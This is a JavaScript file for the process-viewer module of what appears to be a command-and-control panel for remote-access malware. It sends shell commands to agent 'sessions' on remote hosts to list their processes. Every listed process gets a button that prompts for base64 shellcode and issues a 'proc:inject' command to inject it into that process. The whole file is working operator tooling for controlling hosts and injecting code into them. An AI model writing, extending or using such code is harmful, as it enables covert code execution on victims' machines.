// panel/js/procview.js — Process list viewer
window.ProcView = {
    async load(sessionId) {
        const url   = window.Auth.url.replace(/\/$/, '');
        const modal = document.getElementById('proc-modal');
        const tbody = document.getElementById('proc-tbody');
        const title = document.getElementById('proc-title');
        if (!modal || !tbody) return;

        modal.classList.remove('hidden');
        title.textContent = `Processes — Session #${sessionId}`;
        tbody.innerHTML = '<tr><td colspan="3" class="p-3 text-center text-gray-500">Loading…</td></tr>';

        // Detect OS from cached host list so we send the right command
        const host = window.API?.hosts?.find(h => h.id == sessionId);
        const isWin = host?.os?.toLowerCase().includes('win');

        // Both commands produce output that renderProcesses understands.
        // The "shell " prefix is required — bare OS commands are rejected
        // by the agent's built-in command dispatcher.
        const cmd = isWin
            ? 'shell tasklist /fo csv /nh'
            : 'shell ps -eo pid,comm --no-headers';

        try {
            const res = await fetch(`${url}/api/hosts/${sessionId}/command`, {
                method: 'POST',
                headers: { 'X-API-KEY': window.Auth.key, 'Content-Type': 'application/json' },
                body: JSON.stringify({ command: cmd })
            });
            if (!res.ok) {
                tbody.innerHTML = '<tr><td colspan="3" class="p-3 text-red-400">Failed to send command</td></tr>';
                return;
            }
            const data = await res.json();

            // Poll up to 20 × 500ms = 10s
            for (let i = 0; i < 20; i++) {
                await new Promise(r => setTimeout(r, 500));
                const out = await fetch(
                    `${url}/api/hosts/${sessionId}/output/${data.request_id}`,
                    { headers: { 'X-API-KEY': window.Auth.key } }
                );
                if (!out.ok) continue;
                const result = await out.json();
                if (result.status === 'completed' && result.output) {
                    this.renderProcesses(tbody, result.output, isWin);
                    return;
                }
            }
            tbody.innerHTML = '<tr><td colspan="3" class="p-3 text-yellow-400">Timeout waiting for response</td></tr>';
        } catch (e) {
            tbody.innerHTML = `<tr><td colspan="3" class="p-3 text-red-400">Error: ${e.message}</td></tr>`;
        }
    },

    renderProcesses(tbody, output, isWin) {
        const lines = output.trim().split('\n').filter(l => l.trim());
        if (!lines.length) {
            tbody.innerHTML = '<tr><td colspan="3" class="p-3 text-gray-500">No processes returned</td></tr>';
            return;
        }

        const procs = [];

        if (isWin) {
            // tasklist /fo csv /nh  →  "Image Name","PID","Session Name",...
            for (const line of lines) {
                const cols = line.split('","').map(c => c.replace(/^"|"$/g, ''));
                if (cols.length >= 2) {
                    procs.push({ pid: (cols[1] || '').trim(), name: (cols[0] || '').trim() });
                }
            }
        } else {
            // ps -eo pid,comm --no-headers  →  "  123 nginx"
            for (const line of lines) {
                const parts = line.trim().split(/\s+/);
                if (parts.length >= 2) {
                    procs.push({ pid: parts[0], name: parts.slice(1).join(' ') });
                } else if (line.includes('|')) {
                    // Legacy PID|Name format (kept for compatibility)
                    const [pid, name] = line.split('|', 2);
                    procs.push({ pid: pid.trim(), name: (name || '?').trim() });
                }
            }
        }

        procs.sort((a, b) => (parseInt(a.pid) || 0) - (parseInt(b.pid) || 0));

        if (!procs.length) {
            tbody.innerHTML = '<tr><td colspan="3" class="p-3 text-gray-500">Could not parse process list</td></tr>';
            return;
        }

        const esc = s => String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');
        tbody.innerHTML = procs.map((p, i) => `
            <tr class="border-b border-gray-700/50 hover:bg-gray-800/50 ${i % 2 === 0 ? '' : 'bg-gray-800/20'}">
                <td class="px-3 py-1 font-mono text-xs text-gray-500">${esc(p.pid)}</td>
                <td class="px-3 py-1 text-sm text-gray-200">${esc(p.name)}</td>
                <td class="px-3 py-1 text-right">
                    <button onclick="ProcView.inject(${parseInt(p.pid) || 0})"
                            class="text-xs text-gray-500 hover:text-red-400" title="Inject into PID">
                        <i class="fas fa-syringe"></i>
                    </button>
                </td>
            </tr>`).join('');
    },

    inject(pid) {
        if (!pid) return;
        const sc = prompt(`Base64 shellcode to inject into PID ${pid}:`);
        if (!sc) return;
        const sessionId = document.getElementById('proc-title')?.textContent?.match(/#(\d+)/)?.[1];
        if (!sessionId) return;
        window.Terminal.open(parseInt(sessionId), `Session #${sessionId}`);
        setTimeout(() => window.Terminal.sendCommand(`proc:inject ${pid} ${sc}`), 500);
    },

    close() {
        document.getElementById('proc-modal')?.classList.add('hidden');
    }
};
